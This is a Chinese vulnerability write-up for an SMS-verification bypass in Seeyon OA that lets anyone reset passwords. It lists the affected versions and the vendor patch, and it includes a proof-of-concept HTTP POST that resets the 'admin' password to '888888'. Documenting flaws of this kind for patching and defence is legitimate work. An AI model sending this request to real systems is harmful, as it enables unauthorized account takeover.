---
title: "致远 OA 未授权短信验证码绕过重置密码漏洞"
date: 2026-10-17 09:13:09
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "致远OA"
tags:
  - "致远OA"
  - "未授权访问"
  - "漏洞复现"
---
## 漏洞描述

致远互联专注于企业级管理软件领域，是一家集产品的设计、研发、销售及服务为一体高新技术企业。致远 Seeyon OA 存在短信验证码绕过重置密码漏洞，攻击者可以利用该漏洞修改任意用户密码。

参考链接：

- https://service.seeyon.com/patchtools/tp.html#/patchList?type=%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81&id=171

## 披露时间

```
2023.08
```

## 漏洞影响

```
V5-G6、V8.1-SP2、V8.2
```

## 漏洞复现

```
POST /seeyon/rest/phoneLogin/phoneCode/resetPassword HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Content-Length: 45
Connection: close

{"loginName":"admin”,”password":"888888"}
```

## 漏洞修复

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

https://service.seeyon.com/patchtools/tp.html#/patchList?type=%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81&id=171

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E8%87%B4%E8%BF%9C-OA-%E6%9C%AA%E6%8E%88%E6%9D%83%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E.md)
